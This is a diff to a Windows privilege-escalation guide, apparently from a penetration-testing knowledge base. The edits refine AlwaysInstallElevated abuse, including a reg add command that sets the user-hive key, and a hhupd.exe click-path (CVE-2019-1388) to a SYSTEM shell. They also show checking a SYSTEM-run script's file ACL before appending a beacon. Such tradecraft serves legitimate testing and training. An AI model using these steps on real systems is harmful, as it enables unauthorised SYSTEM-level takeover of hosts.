@@ -55,12 +55,18 @@ certutil -decode encoded.b64 file2                                            # 
 
 ## AlwaysInstallElevated
 
-A Group Policy misconfiguration that lets *any* user install an MSI as SYSTEM. It only applies when **both** the per-user and per-machine keys are set - check both, because one alone does nothing:
+A Group Policy misconfiguration that lets *any* user install an MSI as SYSTEM. The elevated install requires **both** the per-user (HKCU) and per-machine (HKLM) keys set to `0x1` - but note the asymmetry: **HKLM is the gate** (only an admin can set it), whereas HKCU lives in *your own* hive and is user-writable. So `HKLM = 0x1` is the finding that matters: if it's enabled but HKCU isn't, you simply set HKCU yourself and proceed. `HKLM = 0x0` can't be fixed from a standard user, so setting HKCU alone does nothing. Check both:
 
 ```powershell
-reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-#   AlwaysInstallElevated    REG_DWORD    0x1     ← need 0x1 in BOTH hives
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # the gate
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # yours to set
+#   AlwaysInstallElevated    REG_DWORD    0x1
+```
+
+If HKLM is `0x1` but HKCU isn't present, set your own before installing:
+
+```cmd
+reg add HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
 ```
 
 With both set, build a malicious MSI and install it silently:
@@ -76,14 +82,16 @@ The reverse shell returns as `NT AUTHORITY\SYSTEM`. PowerUp and winPEAS both fla
 
 ## CVE-2019-1388 (UAC certificate dialog)
 
-A GUI-only escalation in the UAC consent flow. An old Microsoft-signed binary (`hhupd.exe`) carries a certificate whose **Issued By** field renders as a hyperlink (OID `1.3.6.1.4.1.311.2.1.10` / `SpcSpAgencyInfo`). Running it elevated and clicking that link opens a browser **as SYSTEM**; from there, **View page source → Save As** gives a SYSTEM file dialog, and typing `c:\windows\system32\cmd.exe` launches a SYSTEM shell.
+A GUI-only escalation in the UAC consent flow. An old Microsoft-signed binary (`hhupd.exe`) carries a certificate whose **Issued By** field renders as a hyperlink (OID `1.3.6.1.4.1.311.2.1.10` / `SpcSpAgencyInfo`). Running it elevated and clicking that link opens a browser **as SYSTEM**; from there, **View page source → Save As** gives a SYSTEM file dialog, which doubles as a file browser - navigate to System32, show all files, and right-click → Open `cmd.exe` to get a SYSTEM shell (the dialog's own process is SYSTEM, so the child it launches is too).
 
 ```
 Run hhupd.exe as administrator
  → "Show information about the publisher's certificate"
  → General tab → click the "Issued by" hyperlink → OK
  → browser opens as SYSTEM → right-click → View page source
- → right-click → Save as → type c:\windows\system32\cmd.exe → Enter
+ → right-click → Save as  (this opens a SYSTEM file-browser dialog)
+ → "Save as type" → All Files (*.*) → browse to C:\Windows\System32
+ → right-click cmd.exe → Open   ← spawns cmd.exe as SYSTEM (do NOT just type the path + Enter; that tries to SAVE a file, it won't execute)
 ```
 
 Key constraints: it needs **interactive GUI access** (console or RDP), not just a shell, and it was patched in November 2019 - so it only lands on an unpatched host where you have a desktop. Always worth a try when you land in a GUI session as a low-priv user on an older build.
@@ -97,15 +105,19 @@ Get-ScheduledTask | select TaskName,State
 schtasks /query /fo LIST /v        # Run As User: SYSTEM on anything interesting?
 ```
 
-The real win isn't editing the task object - it's a **script the task runs** sitting in a directory with weak ACLs. Find writable script locations and append your payload; the next scheduled run executes it as the task's identity:
+The real win isn't editing the task object - it's a **script the task runs** sitting somewhere with weak ACLs. A writable directory is the lead, but confirm the **script file itself** is writable before relying on it - a file can carry a protected, non-inheriting ACL that denies writes even when its parent folder grants `Users` RW:
 
 ```
+:: 1. find a candidate directory (-d checks the DIRECTORY ACL only)
 .\accesschk64.exe /accepteula -s -d C:\Scripts\
-#  C:\Scripts
-#    RW BUILTIN\Users        ← users can write the scripts a SYSTEM task runs
+#  C:\Scripts   RW BUILTIN\Users
+
+:: 2. CONFIRM write/append on the actual script (no -d → checks the file's own ACL)
+.\accesschk64.exe /accepteula -quv C:\Scripts\db-backup.ps1
+#  RW BUILTIN\Users   FILE_APPEND_DATA / FILE_WRITE_DATA   ← only now is append safe
 ```
 
-Append a beacon/one-liner to `db-backup.ps1` et al. and wait for the schedule. This is the scheduled-task instance of the general "a privileged process runs a file I can modify" pattern - the same shape as modifiable [autoruns and service binaries](/codex/windows/privesc/weak-permissions/#5-modifiable-autorun-binary). It's patient (waits on the schedule) but reliable.
+Once the file is confirmed writable, append a beacon/one-liner to it and wait for the schedule. This is the scheduled-task instance of the general "a privileged process runs a file I can modify" pattern - the same shape as modifiable [autoruns and service binaries](/codex/windows/privesc/weak-permissions/#5-modifiable-autorun-binary). It's patient (waits on the schedule) but reliable.
 
 ## Account description fields
 
